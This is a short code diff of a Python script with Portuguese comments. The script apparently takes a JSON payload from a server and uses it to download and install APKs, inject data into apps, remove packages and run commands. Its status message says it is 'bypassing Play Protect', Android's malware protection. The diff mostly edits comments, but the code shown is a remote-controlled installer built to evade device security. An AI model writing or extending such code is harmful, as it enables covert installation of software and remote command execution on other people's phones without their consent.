@@ -47,7 +47,7 @@ def install_apk(url, visibility):
 
     if os.path.exists(tmp_path):
         console.print("[bold yellow]⚙️ Processando pacote e burlando Play Protect...[/bold yellow]")
-        # CORREÇÃO AQUI: Chaves duplas no {{print $2}} para não quebrar o Python!
+        # AQUI ESTÁ A CORREÇÃO: Chaves duplas no awk!
         cmd_get_pkg = f"aapt dump badging {tmp_path} | grep package | awk '{{print $2}}' | sed s/name=//g | sed s/\\'//g"
         pkg_name = subprocess.getoutput(cmd_get_pkg).strip()
 
@@ -115,7 +115,6 @@ if __name__ == "__main__":
     try:
         data = json.loads(sys.argv[1])
 
-        # Lê corretamente "install" (inglês) ou "instalar" (português)
         install_tasks = data.get("install", []) + data.get("instalar", [])
         for item in install_tasks:
             apk_url, visibility, _, extra = item[0], item[1], item[2], item[3]
@@ -126,12 +125,10 @@ if __name__ == "__main__":
             if pkg and extra.get("data_link"):
                 inject_data(extra["data_link"], pkg, app_name)
 
-        # Trata o novo array de "remove" que o servidor está enviando
         remove_tasks = data.get("remove", []) + data.get("remover", [])
         for target_pkg in remove_tasks:
             remove_app(target_pkg)
 
-        # Lê os "commands" e executa
         command_tasks = data.get("commands", []) + data.get("comandos", [])
         for cmd in command_tasks:
             if cmd.startswith("remove "):
